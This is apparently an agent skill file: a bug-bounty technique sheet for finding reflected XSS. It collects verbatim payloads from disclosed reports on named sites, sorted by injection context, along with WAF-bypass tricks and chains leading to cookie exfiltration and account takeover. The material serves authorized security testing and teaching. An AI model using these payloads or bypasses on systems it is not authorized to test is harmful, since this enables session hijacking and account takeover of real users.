---
name: hunter-l3-reflected-xss
description: "Use when hunting Reflected XSS on a target. Loads the L3 technique sheet: Reflected XSS is attacker-controlled input (URL path, query parameter, POST body, HTTP header, or even cookie) echoed back into the server's immediate response without output encoding, executing JavaS"
domain: cybersecurity
subdomain: web
tags:
- web
- reflected-xss
- hunting
- l3
version: '1.0'
---

# Reflected XSS — Technique Sheet

## Overview

Reflected XSS is attacker-controlled input (URL path, query parameter, POST body, HTTP header, or even cookie) echoed back into the server's immediate response without output encoding, executing JavaScript in the victim's browser on the trusted origin. It pays when the affected origin holds sessions/cookies with real privilege — admin panels (Revive Adserver), corporate SSO portals (GM, DoD), app backends (Shopify, Zomato, Imgur) — and is especially valuable when paired with a delivery mechanism (CSRF auto-submit, clickjacking, redirect, widget iframe) that turns "self-XSS" or obscure params into a genuine victim-driven attack. Highest-impact instances chained to cookie exfiltration and full account takeover.

## Distinct sub-patterns

### 1. URL-path reflection → attribute breakout (onmouseover/onerror)
- **Endpoint shape:** `GET /cs/new-york-city/turtle-bay-restaurants/fast-casual/{id}`; `GET /learner/ContactUs.aspx/{path}/Signin.aspx`; `GET /user/{username}` and `/user/{username}/message` (mobile); `GET /themes/filter/blog/type/{type}`; `GET /customerror/{uri-path}`
- **Payload (verbatim):**
  - `1zqjrw'/onmouseover='alert(1)'/style='height:200;width:200'/b=` — hover-triggered, Firefox (id=139981, Eternal/Zomato)
  - `(A('onerror='alert%60xElkomy%60'xelkomy))/Signin.aspx` — ASPX path segment (id=1091165, MTN Group)
  - `%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E` in the username path (id=106982, id=107036, Imgur mobile)
  - `%22%3E%3Cimg%20src=a%20onerror=alert%28document.domain%29%3E` (id=111500, Automattic/wordpress.com)
  - `<Svg OnLoad=alert(1)>` as the error-page URI path (id=1094276, DoD)
- **Root cause:** Path segments (including segments between real route parts, and 404/error-page paths) are reflected into HTML — often into an `<a href>` or tag attribute — without encoding quotes or angle brackets.
- **Impact:** alert/confirm firing; session hijacking, CSRF bypass, ad-jacking, victim-data access (MTN). Error-page paths reflect on unauthenticated URLs — zero victim interaction beyond opening the link.
- **Exemplars:** id=139981, id=1091165, id=1094276

### 2. Query parameter → HTML attribute breakout (`">` + img/svg)
The workhorse pattern; nearly a third of records.
- **Endpoint shape:** arbitrary `GET /...?param=...` — e.g. `?sub_div_ofc_sym_cd=`, `?type=`, `/php/fb_login_pass_reset?type=`, `/blogsearch?q=`, `/████?profile_id=`, Product Reviews app `email` field
- **Payload (verbatim):**
  - `%22%3E%3Csvg/onload=alert(%22nagli%22)%3E` (id=1065167)
  - `%22%3E%3Csvg/onload=alert%28document.domain%29%3E%3Ch1%3EBoooooya!!%3C/h1%3E` (id=114151)
  - `"><img src=a onerror=alert(1)>123@sdf.com` — email field reflected on the product page, unauthenticated (id=1029668, Shopify)
  - `"><img src=x onerror=alert(document.cookie);>` (id=1037714); `"><script>alert(1);</script>` (id=1081747, id=1084156)
  - `"><script>alert(document.domain)</script>` (id=111365)
- **Root cause:** Value reflected into (or adjacent to) an HTML attribute context without output encoding; `">` closes the surrounding tag/attribute and a fresh `<img>`/`<svg>` is parsed.
- **Impact:** Unauthenticated reflected execution (Shopify product pages); cookie theft, arbitrary JS on the victim's session.
- **Exemplars:** id=1029668, id=1065167, id=114151

### 3. Inline-JavaScript context breakout (quote/brace escape)
- **Endpoint shape:** `GET /search/node?search=...`; search term / reflected param inserted into inline `<script>` blocks
- **Payload (verbatim):**
  - `';alert('chron0x');'` (id=1062380)
  - `?█████=';}alert("chron0x"); function clickit(){//` (id=1059395)
  - `"}');alert(document.domain);console.log('` — `language_id` of `GET /widgets/res_search_widget.php` (id=115402, Eternal/Zomato)
  - `');alert('XSS` — `properties[builder_id]` on `GET /cart/add` (id=116006, Shopify; fired on victim clicking "Remove")
  - URL path: `asd%27%3Balert%28%27XSS%29%3B%27` on `wholesale.shopify.com` (id=106293 — path reflected into script context without encoding quotes/`<`/`>`); `/verification/asd',%20alert(document.location),%20%27` (id=1051373, Reddit — fires when victim clicks "verify email")
- **Root cause:** Input embedded inside a JS string literal in inline script; single/double quote + parenthesis/brace sequences terminate the string and inject statements.
- **Impact:** Full script control on the trusted origin; Zomato widget case could steal the CSRF token and act as the user (invite/remove friends, post reviews, message users).
- **Exemplars:** id=1062380, id=115402, id=116006

### 4. Script-tag close breakout (`</script>` injection)
- **Endpoint shape:** params reflected inside an existing `<script>...</script>` block — `/admin/userlog-index.php?period_preset=`, `/████` param, `/help/search` cookie reflection, sockjs transport
- **Payload (verbatim):**
  - `all_events%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E%3Cscript%3E` (id=1083231, Revive Adserver)
  - `%22%3E%3C/script%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E` (id=1103033); `%3C/script%3E%3Cscript%3Ealert(origin)%3C/script%3E` (id=1154378)
  - `CE399%22%3E%3C/script%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E` (id=1095765 — parameter unescaped for URL-encoded values)
  - Cookie-based: `c5ff00ff-...-</script ><script>alert(8)</script>` in the `ahoy_visit` cookie, reflected into inline `pageViewProps` JS with `Content-Type: text/html` (id=105419, Instacart)
  - `alert('XSS')//` reflected by vulnerable sockjs `GET /sock/{n}/{n}/{n}/{n}/htmlfile?c=` (id=1100326)
- **Root cause:** Value lands inside a script element; a literal `</script>` (even with odd whitespace `</script >`) ends it and a new script/img tag follows.
- **Impact:** Execution on admin panels (Revive) and main domains; Instacart case enabled XSS + session manipulation from a pure cookie reflection.
- **Exemplars:** id=1083231, id=105419

### 5. Title/textarea/RCDATA breakout
- **Endpoint shape:** `GET /portal/pls/portal/PORTAL.wwexp_render.show_tree?title=`; POST comment edit (textarea); param reflected in RCDATA contexts
- **Payload (verbatim):**
  - `</title><svg/onload=alert(domain)>` (id=1073780, DoD)
  - `</textarea><script>alert(1)</script>` (id=164520, Nextcloud)
  - `</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=prompt(document.cookie)//>\x3e` (id=1040639, Automattic — mixed-case + `--!>` comment trick)
  - `'"1<!--></Title/</Textarea/</Script/><Details/Open/OnToggle=(confirm)(1)>` (id=1145712, Acronis — closes Title, Textarea, and Script with comment trickery, then uses `<details open ontoggle>`)
- **Root cause:** RCDATA elements (`<title>`, `<textarea>`) don't parse tags until closed; injecting the closer returns the parser to HTML context where `<svg onload>` executes.
- **Impact:** Ranged from self-XSS proof (Nextcloud) to the strongest chain in the dataset (see §Chains): ESI-injected HttpOnly-cookie exfiltration → account takeover (id=1073780).
- **Exemplars:** id=1073780, id=1145712

### 6. Event-handler injection into existing attributes (incl. accesskey trap)
- **Endpoint shape:** `GET /admin/stats.php?...&setPerPage=15...`; `GET /gri/ziptool/search.aspx?a=`
- **Payload (verbatim):**
  - `15%27%20onclick=alert(document.domain)%20accesskey=X%20` (id=1083376, Revive Adserver — attribute injection activated by pressing the `accesskey` combo, e.g. Alt+Shift+X)
  - `simo%27onfocus=%27confirm(document.domain)%27name=%27simo%27#simo` (id=1033253, DoD — autofocus-style `onfocus` in a search box)
  - `OnMoUsEoVeR=prompt(/hacked/)//` (id=1145162, Shopify — case-mangled handler name with no tags at all, reflected into a spot that becomes an attribute)
- **Root cause:** Input injected into an attribute position without encoding quotes/spaces; the handler is passive and needs one interaction (hover, focus, click, key combo) — useful where `<script>` tags are filtered but quotes aren't.
- **Impact:** alert/prompt execution; cookie theft or forced redirect.
- **Exemplars:** id=1083376, id=1033253

### 7. `javascript:` URI injection in URL/redirect parameters
- **Endpoint shape:** `GET /emerald/give-emerald?redirect=...` (Imgur); `?config=` JSON override (Grammarly)
- **Payload (verbatim):**
  - `javascript:alert(document.cookie)` (id=1058427)
  - `?config={"account":{"subscription":"javascript:alert(document.domain)//"},"api":{"redirect":"javascript:alert(document.domain)//"}}` (id=1082847)
- **Root cause:** Reflected value is used as a link/redirect target without scheme validation. In the Grammarly case, `?config=` was JSON-parsed and merged into app config; properties missing from the partial TypeScript schema (`api.redirect`, `account.subscription`) were consumed unsanitized as URLs — schema-validation gap, not classic reflection. Config persisted for the session and was hidden by the `/docs/new` URL rewrite; CSP did not block it (unsafe-inline/unsafe-eval allowed).
- **Impact:** JS execution on origin without any HTML injection — survives strict HTML-encoding filters.
- **Exemplars:** id=1058427, id=1082847

### 8. HTTP-header reflection
- **Endpoint shape:** `GET /header.aspx` with attacker-controlled `Referer`
- **Payload (verbatim):** `Referer: https://www.google.com/search?hl=en&q=testing'"()&%"><img src=x onerror=alert(document.domain)>` (id=1069528, MTN Group)
- **Root cause:** Referer echoed into the response without encoding. Deliverable by luring the victim from an attacker-controlled link so the Referer carries the payload.
- **Impact:** Reflected unescaped; enables session-cookie theft and account impersonation.
- **Exemplar:** id=1069528

### 9. Self-XSS + CSRF auto-submit (making self-XSS real)
- **Endpoint shape:** `POST /` form field `first_name`; registration form `company_name`; Acronis form fields
- **Payload (verbatim):** `test";</script><script>alert(document.cookie)</script>` (id=1109544)
- **Root cause:** Input reflected unencoded (nominally self-XSS) but the form has **no CSRF token**, so an attacker auto-submits the form cross-origin with the payload as the field value — the "self" part disappears.
- **Impact:** Reflected XSS executed in the victim's session purely from them visiting an attacker page.
- **Exemplars:** id=1109544, id=106678 (Informatica `company_name` registration), id=1081747/id=1084156 (Acronis contact/roadshow forms)

### 10. Widget/iframe parameter reflection into the parent origin
- **Endpoint shape:** `GET /widgets/res_search_widget.php?language_id=`, developers.zomato.com widget search input, Foodie Index widget `longitude`/`latitude`
- **Payload (verbatim):**
  - `"}');alert(document.domain);console.log('` in `language_id` (id=115402)
  - `<img src=x onerror=alert(document.domain)>` in the widget search bar (id=114631)
  - `<img class="emoji" alt="😯" src="x" /><svg onload=prompt(document.domain)>` in longitude/latitude (id=114631)
- **Root cause:** Embeddable widgets run on the parent's origin (zomato.com); parameters are output unsanitized. Victim opens the widget URL in an iframe → code executes **in the main-site origin with the user's active session**.
- **Impact:** CSRF-token theft and acting as the user on the primary domain — a low-profile subdomain/widget endpoint granting full main-origin privileges.
- **Exemplar:** id=115402, id=114631

### 11. Server-side fetch rendering (url= parameter) — XSS via SSRF-ish reflection
- **Endpoint shape:** `GET /████&url={url}` — server requests the supplied URL and renders the path/response unsanitized
- **Payload (verbatim):** `<img src=x onerror=alert(1)>` placed in the fetched path (id=1149144)
- **Root cause:** The server fetches the attacker-controlled URL and reflects content without encoding; the request is issued via XHR, so it is **not CSRF-able**.
- **Impact:** JS executed on the victim's behalf; the same endpoint also revealed outbound-request SSRF.
- **Exemplar:** id=1149144

### 12. CSS-context injection (legacy IE)
- **Endpoint shape:** Shopify widget `GET /products/{slug}?style=...&button-bg-color=...` (widgets.shopifyapps.com)
- **Payload (verbatim):** `button-bg-color=expression(alert(1))` (id=105659)
- **Root cause:** Params reflected into a style/CSS context; `expression()` executes in IE ≤10 / compat mode.
- **Impact:** alert on IE-only victims — deprecated, but proves style-context reflection can be exploitable where HTML tags are blocked.
- **Exemplar:** id=105659

### 13. Third-party/vulnerable-component XSS on the target's subdomain
- **Endpoint shape:** nginx status module `GET /status{payload}`; vulnerable sockjs; vendor services
- **Payload (verbatim):** `/status%3E%3Cscript%3Ealert(31337)%3C%2Fscript%3E` (id=1159364 — nginx module reflects request path into the status page); sockjs `c=` (id=1100326)
- **Root cause:** The app code is clean, but a bundled framework/module reflects paths or params. Also: Informatica XSS in a third-party vendor service (id=1095797), Grammarly config schema gap (id=1082847).
- **Impact:** Execution on the company's own host (ips.mtn.co.ug) — still in scope, still their session.
- **Exemplars:** id=1159362, id=1100326

## Bypass / chain notes

**Filter/WAF bypasses observed:**
- **Newline obfuscation:** `<a+href="ja%0A%0Dvascript:alert(document.domain)">Click</a>` — `java\n\rscri\npt` split via `%0A%0D` bypassed the WAF on a DoD `/search` keyword POST (id=1012249).
- **Case mangling:** `</teXtarEa/</scRipt/--!>` (id=1040639); `OnMoUsEoVeR=` (id=1145162); mixed-case `<sVg/oNloAd=`.
- **Tagless handlers:** payloads with no `<script>` at all — pure `'/onmouseover='...` attribute fragments (id=139981), `OnMoUsEoVeR=...//` (id=1145162), `onclick=... accesskey=X` (id=1083376).
- **Alternate sinks:** `<details open ontoggle=...>`, `<svg onload=...>`, `<img onerror>` instead of script tags; `confirm(1)`/`prompt()` as `(confirm)(1)` parenthesized calls (id=1003433, id=1145712).
- **Comment tricks:** `--!>` terminator and `<!-->` opens (id=1040639, id=1145712).
- **String.fromCharCode:** `confirm(String.fromCharCode(88,83,83))` (id=104559).
- **Redirect-mediated encoding bypass:** a redirect from `r.php` bypassed query-string encoding, letting the raw payload land in a form's `action` attribute (id=111365).

**Multi-step chains in the records:**
1. **Reflected XSS → ESI injection → HttpOnly cookie exfiltration → account takeover:** `</title><svg/onload=...>` in `title` fetches an ESI-injection URL, reads the (otherwise protected) cookie from the response, exfiltrates it to the attacker's server (id=1073780).
2. **Self-XSS + CSRF auto-submit:** unencoded self-XSS field + missing CSRF token → reflected XSS in a victim's session (id=1109544).
3. **JSON config override → javascript: URI → session-persistent execution:** `?config=` persists for the session and hides behind a URL rewrite; also redirected desktop/office-addin install URLs (id=1082847).
4. **Server-side fetch + clickjacking:** because the `url=` fetch is XHR (not CSRF-able), clickjacking was used to trigger it (id=1149144).
5. **Widget iframe → main-origin session:** crafted widget URL opened in iframe executes in the primary domain with the user's active session → CSRF token theft (id=115402).
6. **Interaction-gated execution:** Reddit `/verification/` payload fires when the victim clicks "verify email" (id=1051373); Shopify cart payload fires on "Remove" click (id=116006); Revive accesskey payload on Alt+Shift+X (id=1083376).

## Gotchas / what NOT to do

- **Don't dismiss self-XSS** — check for CSRF protection on the form first (id=1109544 shows the combo is fully valid reflected XSS). Conversely, a pure self-XSS with CSRF protection and no delivery is a duplicate/no-bug (Nextcloud id=164520 was dup'd to #164027).
- **Context matters more than tags:** several payloads contain zero `<script>` — pure quote-breakout into attributes (`id=139981`) or JS string escapes (`id=115402`, `id=116006`). Fuzz each context (HTML body, attribute, JS string, inside `<script>`, `<title>`, `<textarea>`, CSS) with context-appropriate breakouts.
- **Don't test only the obvious GET params:** reflected sinks include POST fields (`fld_frompor`, `keyword`, form fields), the `Referer` header (id=1069528), cookies (`ahoy_visit`, id=105419), URL *path segments* between real route parts (`ContactUs.aspx/{path}/Signin.aspx`), error-page paths, and widget params.
- **Hover/focus/click/accesskey-gated handlers are accepted** but harder to demo — prefer `onload`/`onerror` auto-firing payloads (`<svg onload>`, `<img onerror>`) for a clean video PoC; the DoD programs in this set paid on video-evidenced alerts.
- **A duplicate is still a payout if it's a *new instance*:** the DoD `url` param bypassed a prior fix (#1002977) — re-testing patched endpoints and sibling parameters is legitimate (id=1010316).
- **Scope note:** HackerOne confirmed the `get_recording_slides_xml.xml` XSS but noted the system held no sensitive report data — impact still paid but was qualified (id=1028396). Prefer sinks on session-bearing origins.
- **Vendor/third-party findings can count:** XSS in a third-party service used by the target was patched for the vendor's other customers too (id=1095797) — worth reporting against the program that deployed it.
- **Redacted/unclear params:** several records (id=1010316, id=1095765, id=1147060) redact the parameter but confirm URL-encoded reflection — always test both raw and fully URL-encoded forms (`%22%3E%3Csvg...`), as some filters decode then fail to re-encode (explicit root cause in id=1095765).

## Real-world impact examples

- **Account takeover via cookie exfiltration:** DoD portal XSS chained with ESI injection exfiltrated the victim's HttpOnly session cookie to the attacker's server, enabling full account takeover (id=1073780).
- **Full user impersonation:** Zomato widget XSS stole the CSRF token; attacker could invite/remove friends, post reviews, and message users as the victim (id=115402). MTN's macademy XSS enabled session hijacking, CSRF bypass, ad-jacking, and viewing/modifying victim data (id=1091165).
- **Unauthenticated store compromise surface:** Shopify Product Reviews email field let an *unauthenticated* visitor execute JS on a store's product page (id=1029668).
- **Admin-panel takeover:** Revive Adserver admin pages (userlog-index, stats, campaign-zone-zones) reflected params unencoded — cookie theft and forced redirects of logged-in admins (id=1083231, id=1083376, id=1097979).
- **Cross-product reach:** Grammarly config override also let attacker-controlled javascript: URLs into desktop and Office-addin install URLs, extending a web XSS to native contexts (id=1082847).
- **Enterprise/government execution:** confirmed reflected XSS on gmid.gm.com and gmchat.gm.com (ids 109461, 112001, 116135), and multiple DoD `.mil` hosts where execution grants "any action or any information the victim can access" (id=1003433, id=1147060).